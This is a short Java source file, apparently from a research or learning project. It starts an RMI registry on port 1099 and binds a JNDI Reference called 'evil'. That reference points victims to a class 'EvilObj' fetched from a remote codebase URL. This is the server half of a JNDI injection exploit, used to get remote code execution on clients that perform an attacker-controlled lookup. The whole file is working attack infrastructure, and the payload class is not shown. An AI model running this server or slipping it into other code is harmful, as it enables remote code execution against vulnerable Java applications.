package cn.naches.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(1099);
            Registry registry = LocateRegistry.getRegistry();

            System.out.println("Created RMI registry on port 1099");

            Reference reference = new Reference("cn.naches.rmi.EvilObj", "cn.naches.rmi.EvilObj",
                    "http://naches.cn/");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
